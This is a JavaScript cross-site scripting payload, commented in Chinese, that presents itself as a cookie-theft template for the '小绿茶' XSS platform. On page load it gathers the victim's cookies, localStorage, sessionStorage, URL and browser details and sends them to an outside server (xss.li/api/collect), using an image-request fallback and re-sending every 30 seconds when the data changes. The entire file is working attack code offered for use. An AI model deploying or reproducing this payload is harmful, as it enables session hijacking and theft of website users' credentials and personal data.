
// Cookie窃取Payload - 小绿茶XSS平台模板
// 用于窃取用户Cookie信息并发送到指定服务器

(function() {
    'use strict';
    
    // 配置信息
    var config = {
        serverUrl: 'https://xss.li' + '/api/collect', // 数据接收地址,小绿茶的地址
        maxLength: 4096, // 最大发送长度
        timeout: 5000 // 超时时间
    };
    
    // 收集Cookie信息
    function collectCookies() {
        var cookies = {
            documentCookie: document.cookie || '',
            localStorage: {},
            sessionStorage: {}
        };
        
        // 尝试获取localStorage数据
        try {
            for (var key in localStorage) {
                if (localStorage.hasOwnProperty(key)) {
                    cookies.localStorage[key] = localStorage.getItem(key);
                }
            }
        } catch (e) {
            console.log('无法访问localStorage:', e);
        }
        
        // 尝试获取sessionStorage数据
        try {
            for (var key in sessionStorage) {
                if (sessionStorage.hasOwnProperty(key)) {
                    cookies.sessionStorage[key] = sessionStorage.getItem(key);
                }
            }
        } catch (e) {
            console.log('无法访问sessionStorage:', e);
        }
        
        return cookies;
    }
    
    // 发送数据到服务器
    function sendData(data) {
        try {
            // 使用XMLHttpRequest发送数据
            var xhr = new XMLHttpRequest();
            xhr.open('POST', config.serverUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.timeout = config.timeout;
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        console.log('Cookie数据发送成功');
                    } else {
                        console.log('Cookie数据发送失败:', xhr.status);
                    }
                }
            };
            
            xhr.ontimeout = function() {
                console.log('Cookie数据发送超时');
            };
            
            xhr.send(JSON.stringify(data));
            
        } catch (e) {
            console.log('发送Cookie数据时出错:', e);
            
            // 降级方案：使用Image对象发送
            try {
                var img = new Image();
                var params = 'data=' + encodeURIComponent(JSON.stringify(data));
                img.src = config.serverUrl + '?' + params;
            } catch (e2) {
                console.log('降级发送也失败:', e2);
            }
        }
    }
    
    // 主函数
    function main() {
        var cookies = collectCookies();
        
        var payload = {
            type: 'cookie_steal',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            cookies: cookies,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            browser: {
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine
            }
        };
        
        console.log('🍃 小绿茶XSS平台 - Cookie窃取模块');
        console.log('正在收集Cookie数据...');
        
        // 立即发送一次
        sendData(payload);
        
        // 每30秒再次发送
        setInterval(function() {
            var newCookies = collectCookies();
            if (JSON.stringify(newCookies) !== JSON.stringify(cookies)) {
                payload.cookies = newCookies;
                payload.timestamp = new Date().toISOString();
                sendData(payload);
                cookies = newCookies;
            }
        }, 30000);
    }
    
    // 执行主函数
    main();
    
})();